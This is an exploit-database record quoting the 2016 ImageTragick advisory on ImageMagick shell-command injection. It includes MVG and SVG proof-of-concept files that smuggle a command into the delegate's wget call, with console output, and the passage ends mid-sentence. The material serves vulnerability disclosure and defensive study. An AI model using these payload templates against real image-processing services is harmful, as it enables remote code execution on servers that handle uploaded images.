{
    "text": "ecve : CVE-2016-3718 CVE-2016-3717 CVE-2016-3716 CVE-2016-3715 CVE-2016-3714 ， title : ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabilities - Multiple dos Exploit ， verified : Not Verified ， exploit_detail : Nikolay Ermishkin from the Mail.Ru Security Team discovered several ， vulnerabilities in ImageMagick. ， We've reported these issues to developers of ImageMagick and they made a ， fix for RCE in sources and released new version ( 6.9.3-9 released ， 2016-04-30 but this ， fix seems to be incomplete. We are still working with developers. ， ImageMagick : Multiple vulnerabilities in image decoder ， 1. CVE-2016-3714 - Insufficient shell characters filtering leads to ，  ( potentially remote ) code execution ， Insufficient filtering for filename passed to delegate's command allows ， remote code execution during conversion of several file formats. ， ImageMagick allows to process files with external libraries. This ， feature is called 'delegate'. It is implemented as a system (  ) with ， command string ( 'command' ) from the config file delegates.xml with ， actual value for different params ( input/output filenames etc ) . Due to ， insufficient %M param filtering it is possible to conduct shell command ， injection. One of the default delegate's command is used to handle https ， requests :  ， \"wget\" -q -O \"%o\" \"https : %M\" ， where %M is the actual link from the input. It is possible to pass the ， value like ` \"-la` and execute unexpected 'ls ， -la'. ( wget or curl should be installed )  ，  $ convert ' \"-la' out.png ， total 32 ， drwxr-xr-x 6 user group 204 Apr 29 23 : 08 . ， drwxr-xr-x+ 232 user group 7888 Apr 30 10 : 37 .. ， The most dangerous part is ImageMagick supports several formats like ， svg , mvg ( thanks to for his research of ， this file format and idea of the local file read vulnerability in ， ImageMagick , see below )  , maybe some others - which allow to include ， external files from any supported protocol including delegates. As a ， result , any service , which uses ImageMagick to process user supplied ， images and uses default delegates.xml / policy.xml , may be vulnerable to ， this issue. ， exploit.mvg ， -=-=-=-=-=-=-=-=- ， push graphic-context ， viewbox 0 0 640 480 ， fill 'url ( \"-la ) ' ， pop graphic-context ， exploit.svg ， -=-=-=-=-=-=-=-=- ， <?xml version=\"1.0\" standalone=\"no\"?> ， < ! DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" ， <svg width=\"640px\" height=\"480px\" version=\"1.1\" ， xmlns=\" xmlns : xlink= ， <image xlink : href=\" \"-la\" ， x=\"0\" y=\"0\" height=\"640px\" width=\"480px\"/> ， </svg> ，  $ convert exploit.mvg out.png ， total 32 ， drwxr-xr-x 6 user group 204 Apr 29 23 : 08 . ， drwxr-xr-x+ 232 user group 7888 Apr 30 10 : 37 .. ， ImageMagick tries to guess the type of the file by it's content , so ， exploitation doesn't depend on the file extension. You can rename ， exploit.mvg to exploit.jpg or exploit.png to bypass file type checks. In ， addition , ImageMagick's tool 'identify' is also vulnerable , so it can't ， be used as a protection to filter file by it's content and creates ， additional attack vectors ( e.g. via 'less exploit.jpg' , because ， 'identify' is invoked via lesspipe.sh ) . ， Ubuntu 14.04 and OS X , latest system packages ( ImageMagick 6.9.3-7 Q16 ， x86_64 2016-04-27 and ImageMagick 6.8.6-10 2016-04-29 Q16 ) and latest ， sources from 6 and 7 branches all are vulnerable. Ghostscript and wget ，  ( or curl ) should be installed on the system for successful PoC ， execution. For svg",
    "time": "2016-05-04"
}